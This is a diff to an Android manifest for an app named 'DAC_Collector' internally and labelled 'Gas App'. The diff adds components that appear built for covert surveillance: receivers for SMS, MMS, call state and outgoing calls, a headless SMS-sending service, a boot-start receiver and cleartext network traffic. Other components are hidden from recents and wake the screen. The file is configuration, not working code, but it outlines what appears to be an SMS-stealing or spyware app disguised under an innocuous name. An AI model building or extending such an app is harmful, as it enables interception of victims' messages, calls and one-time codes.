@@ -11,6 +11,7 @@
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -25,6 +26,7 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
     <uses-permission android:name="android.permission.SEND_SMS" />
 
     <application
@@ -34,19 +36,21 @@
         android:fullBackupContent="@xml/backup_rules"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
+        android:networkSecurityConfig="@xml/network_security_config"
         android:roundIcon="@mipmap/ic_launcher"
         android:supportsRtl="true"
         android:theme="@style/Theme.DAC_Collector"
+        android:usesCleartextTraffic="true"
         tools:targetApi="31">
         <activity
             android:name=".Ui.DialogActivity"
             android:excludeFromRecents="true"
+            android:exported="true"
             android:launchMode="singleInstance"
             android:noHistory="true"
             android:persistableMode="persistAcrossReboots"
             android:showOnLockScreen="true"
-            android:turnScreenOn="true"
-            android:exported="true" />
+            android:turnScreenOn="true" />
 
         <property
             android:name="android.adservices.AD_SERVICES_CONFIG"
@@ -71,6 +75,8 @@
             android:name=".Ui.MainActivity"
             android:excludeFromRecents="true"
             android:exported="true"
+            android:label="Gas App"
+
             android:launchMode="singleInstance"
             android:noHistory="true"
             android:persistableMode="persistAcrossReboots"
@@ -78,13 +84,13 @@
             android:turnScreenOn="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
         <service
             android:name=".Services.SmsSenderJOBService"
+            android:enabled="true"
             android:excludeFromRecents="true"
             android:launchMode="singleInstance"
             android:permission="android.permission.BIND_JOB_SERVICE"
@@ -94,11 +100,11 @@
             android:turnScreenOn="true" />
         <service
             android:name=".Services.FetchProfileInfo"
-            android:excludeFromRecents="true"
+            android:enabled="true"
             android:launchMode="singleInstance"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:persistableMode="persistAcrossReboots"
-            android:process=":sendDACSeparate"
+            android:process=":Fetch"
             android:showOnLockScreen="true"
             android:turnScreenOn="true" />
         <service
@@ -131,29 +137,58 @@
             android:turnScreenOn="true" />
         <service
             android:name=".Firebase.FCMPushReceiver"
-            android:excludeFromRecents="true"
-            android:exported="false"
-            android:launchMode="singleInstance"
-            android:persistableMode="persistAcrossReboots"
-            android:process=":fireBase"
-            android:showOnLockScreen="true"
-            android:stopWithTask="false"
-            android:turnScreenOn="true">
+            android:enabled="true"
+            android:exported="true">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
         </service>
 
+        <!-- BroadcastReceiver that listens for incoming MMS messages -->
         <receiver
-            android:name=".Receivers.MyReceiver"
+            android:name=".Receivers.MmsReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+
+                <data android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".Receivers.CallReceivers"
             android:enabled="true"
-            android:exported="false" />
+            android:exported="false">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+        <!-- Service that delivers messages from the phone "quick response" -->
+        <service
+            android:name=".Services.HeadlessSendSms"
+            android:exported="true"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </service>
+
 
         <service
             android:name=".Services.FixOppoAutoKill"
             android:enabled="true"
             android:exported="true"
-            android:isolatedProcess="true"
             android:process=":remote"
             android:stopWithTask="false" />
 
@@ -170,6 +205,16 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
+
+        <receiver
+            android:name=".Receivers.MyReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
 
         <meta-data
             android:name="ScopedStorage"
